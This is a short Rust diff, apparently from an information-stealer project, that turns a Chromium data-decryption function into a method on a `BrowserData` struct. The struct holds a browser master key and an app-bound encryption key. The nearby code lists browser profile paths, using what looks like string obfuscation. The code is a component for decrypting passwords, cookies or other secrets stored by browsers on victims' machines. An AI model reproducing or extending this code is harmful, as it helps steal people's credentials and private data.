@@ -122,6 +122,18 @@ pub(super) struct BrowserData {
     profiles: Vec<Path>,
 }
 
+impl BrowserData {
+    pub(super) unsafe fn decrypt_data(&self, buffer: &[u8]) -> Option<String> {
+        unsafe {
+            utils::browsers::chromium::decrypt_data(
+                buffer,
+                self.master_key.as_deref(),
+                self.app_bound_encryption_key.as_deref()
+            )
+        }
+    }
+}
+
 pub(super) struct ChromiumBasedBrowser<'a> {
     name: &'a str,
     has_profiles: bool,
@@ -174,14 +186,4 @@ fn get_chromium_browsers<'a>() -> [ChromiumBasedBrowser<'a>; 20] {
         browser!("Brave",                     &local   / s!("BraveSoftware")        / s!("Brave-Browser") / &user_data),
         browser!("Atom",                      &local   / s!("Mail.Ru")              / s!("Atom")          / &user_data),
     ]
-}
-
-pub(super) unsafe fn decrypt_data(buffer: &[u8], browser_data: &BrowserData) -> Option<String> {
-    unsafe {
-        utils::browsers::chromium::decrypt_data(
-            buffer,
-            browser_data.master_key.as_deref(),
-            browser_data.app_bound_encryption_key.as_deref()
-        )
-    }
 }
